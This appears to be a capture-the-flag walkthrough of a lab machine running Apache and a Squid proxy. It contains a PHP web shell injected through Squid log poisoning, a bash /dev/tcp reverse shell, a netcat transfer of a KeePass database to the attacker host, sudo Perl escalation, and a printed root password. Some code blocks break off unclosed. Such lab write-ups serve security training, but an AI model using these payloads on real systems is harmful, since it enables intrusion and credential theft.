### Findings

- **22** → SSH
- **80** → Apache Web Server
- **3128** → Squid Proxy

The presence of a **Squid HTTP Proxy** immediately makes log poisoning a possible attack vector if an LFI vulnerability exists.

# 🌐 Web Enumeration

Browse to port **80**.

<img width="1918" height="862" alt="Screenshot_2026-07-29_09_38_44" src="https://github.com/user-attachments/assets/29e4fada-cf12-4202-a6ab-0cf233104bf7" />

The website displays a page titled **V-Care**.

Although the images are related to hospitals and healthcare, the page content discusses software development services, making the page appear to be a generic template.

<img width="808" height="151" alt="Screenshot_2026-07-29_09_38_59" src="https://github.com/user-attachments/assets/7e3bdd03-1bfa-4df6-98d1-7459e76ce957" />

While inspecting the HTML source code, an interesting parameter is discovered.

```text
page.php?i=about.html
```

This strongly suggests that the page dynamically includes files using the `i` parameter.

---

# 📂 Local File Inclusion

Attempt to read `/etc/passwd`.

```text
http://10.46.28.45/page.php?i=/etc/passwd
```

<img width="1918" height="335" alt="Screenshot_2026-07-29_09_40_49" src="https://github.com/user-attachments/assets/f35ee98e-c3a0-4a3c-831b-899745d1e32c" />

The file is displayed successfully.

This confirms that the application is vulnerable to **Local File Inclusion (LFI)**.

---

# 🔍 Reading Server Logs

Since Nmap identified the web server as Apache, the first attempt is to read the Apache access log.

```text
/var/log/apache2/access.log
```

<img width="1508" height="550" alt="Screenshot_2026-07-29_10_32_39" src="https://github.com/user-attachments/assets/190d5f1f-2125-4c4d-8af8-b88b3ab5575c" />

Instead of displaying the file, the application returns a security alert indicating that a malicious request has been detected.

However, another service is running on the machine:

```text
Squid Proxy (Port 3128)
```

Read the Squid access log instead.

```text
http://10.46.28.45/page.php?i=/var/log/squid/access.log
```

<img width="1918" height="458" alt="Screenshot_2026-07-29_10_47_19---- copy" src="https://github.com/user-attachments/assets/e42eaf91-a907-4df8-8326-7515efea8fbb" />

The access log is displayed successfully.

This provides an opportunity for **log poisoning**.

---

# ☠️ Squid Log Poisoning

A normal log poisoning attempt using the User-Agent header does not work because the request is logged by Apache instead of Squid.

Instead, send the request through the Squid proxy itself.

```bash
curl -s -X GET --proxy "http://10.46.28.45:3128" \
"http://127.0.0.1:80" \
-A '<?php system($_GET["cmd"]); ?>'
```

This injects the PHP payload directly into the Squid access log.

Verify the injection.

```text
http://10.46.28.45/page.php?i=/var/log/squid/access.log&cmd=id;whoami
```

## Result

<img width="1918" height="362" alt="Screenshot_2026-07-29_10_47_19" src="https://github.com/user-attachments/assets/5b64d814-5286-4597-a496-7a70bc09572a" />

```text
uid=33(www-data)
www-data
```

The injected PHP code is executed successfully.

Remote Code Execution has been achieved.

---

# 💻 Reverse Shell

Start a Netcat listener.

```bash
nc -lnvp 443
```

Execute the following URL-encoded reverse shell through the LFI.

```text
http://10.46.28.45/page.php?i=/var/log/squid/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.46.28.76%2F443%200%3E%261%22
```

A reverse shell is obtained as:

```text
www-data
```

---

# 🔧 Upgrading the Shell

Upgrade the shell into a fully interactive TTY.

```bash
script /dev/null -c bash
```

Press:

```text
Ctrl + Z
```

Then execute:

```bash
stty raw -echo; fg
```

```bash
reset xterm
```

```bash
export TERM=xterm
```

```bash
export BASH=bash
```

---

# 🔍 Privilege Escalation (www-data → dorian)

Check the available sudo permissions.

```bash
sudo -l
```

## Result

```text
www-data@care:/var/www/html$ sudo -l
Matching Defaults entries for www-data on care:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on care:
    (dorian) NOPASSWD: /usr/bin/perl
www-data@care:/var/www/html$ l
```

The `www-data` user is allowed to execute **Perl** as **dorian** without supplying a password.

Spawn a shell as **dorian**.

```bash
sudo -u dorian /usr/bin/perl -e 'exec "/bin/sh"'
```

Verify the user.

```bash
id ; whoami
```

## Result

```text
$ id ; whoami
uid=1000(dorian) gid=1000(dorian) groups=1000(dorian)
dorian
$ 
```

Successfully obtained a shell as **dorian**.

---

# 🏁 User Flag

Read the user flag.

```bash
cat /home/dorian/user.txt
```

## Result

```text
dorian@care:~$ cat /home/dorian/user.txt 
97c62ffbfe2e1c78d8048ae2a699619a
dorian@care:~$ 
```

---

# 🔍 Enumerating Dorian's Home Directory

List all files.

```bash
ls -la
```

An interesting hidden directory is discovered.

```text
dorian@care:~$ ls  -la
total 28
drwx------ 3 dorian dorian 4096 Oct  2  2025 .
drwxr-xr-x 3 root   root   4096 Oct  2  2025 ..
drwxr-xr-x 2 dorian dorian 4096 Oct  2  2025 .bak

-r-------- 1 dorian dorian   33 Oct  2  2025 user.txt
dorian@care:~$ 
```

Navigate into it.

```bash
cd .bak
```

List its contents.

```bash
ls
```

```text
dorian@care:~$ cd .bak
dorian@care:~/.bak$ ls
data.txt
```

Identify the file type.

```bash
file data.txt
```

## Result

```text
dorian@care:~/.bak$ file data.txt 
data.txt: Keepass password database 2.x KDBX
dorian@care:~/.bak$ 
```

A KeePass password database has been found.

---

# 📤 Copying the KeePass Database

Transfer the database to the attacker machine.

Attacker:

```bash
nc -lnvp 4444 > data.kdbx
```

Target:

```bash
nc 10.46.28.76 4444 < data.txt
```

---

# 🔓 Cracking the KeePass Database

Attempting to use **keepass2john** results in an unsupported file version.

```bash
keepass2john data.txt
```

```text
$ keepass2john data.txt                       
! data.txt : File version '40000' is currently not supported!
```

Instead, use **keepass4brute**.

Download the tool.

```bash
wget https://raw.githubusercontent.com/r3nt0n/keepass4brute/refs/heads/master/keepass4brute.sh
```

Make it executable.

```bash
chmod +x keepass4brute.sh
```

Run the password attack.

```bash
./keepass4brute.sh data.kdbx /usr/share/wordlists/rockyou.txt
```

## Result

```text
$ ./keepass4brute.sh data.kdbx /usr/share/wordlists/rockyou.txt
keepass4brute 1.3 by r3nt0n

The KeePass master password is:

```text

# 🔑 Recovering Root Credentials

Open the KeePass database using **KeePassXC**.

Unlock it with:

```text

Inside the database, a root credential is stored.

| Username | Password |
|----------|----------|
| root | r00tB0$$123! |

# 🚀 Privilege Escalation (dorian → root)

Switch to the root account.

```bash
su
```

Enter the recovered password.

```text
r00tB0$$123!
```

Verify the privileges.

```bash
id ; whoami
```

## Result

```text
dorian@care:~/.bak$ su 
Password: 
root@care:/home/dorian/.bak# id ; whoami
uid=0(root) gid=0(root) grupos=0(root)
root
```

Successfully obtained a root shell.

# 🏁 Root Flag

Read the root flag.

```bash
cat /root/root.txt

# 🧾 Summary

| Phase | Technique |
|--------|-----------|
| Enumeration | Nmap |
| Web Enumeration | Source Code Review |
| Initial Foothold | Local File Inclusion |
| Code Execution | Squid Log Poisoning |
| Initial Access | Reverse Shell |
| User Pivot | Misconfigured `sudo` (`perl`) |
| Credential Discovery | KeePass Database |
| Password Cracking | keepass4brute |
| Root Access | Stored Root Credentials |

---

# 🚀 Key Takeaways

- Local File Inclusion becomes significantly more dangerous when log files can be included and interpreted by PHP.
- Running a proxy such as **Squid** may unintentionally provide an alternative log file that can be poisoned when Apache logs are protected.
- Misconfigured `sudo` permissions allowing execution of interpreters such as **Perl** can be abused to pivot between users.
- KeePass databases should never be stored in user home directories without proper access controls.
- Weak KeePass master passwords are susceptible to dictionary attacks, potentially exposing highly privileged credentials.
